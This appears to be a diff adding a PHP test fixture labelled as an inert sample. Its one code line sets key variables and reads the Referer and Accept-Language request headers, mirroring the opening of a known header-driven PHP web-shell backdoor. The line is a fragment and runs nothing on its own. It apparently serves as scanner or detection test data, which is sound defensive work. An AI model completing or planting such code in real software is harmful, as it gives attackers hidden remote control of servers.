@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+$kh="4f7f";$kf="28d7"; $rr=@$r["HTTP_REFERER"]; $ra=@$r["HTTP_ACCEPT_LANGUAGE"];
+
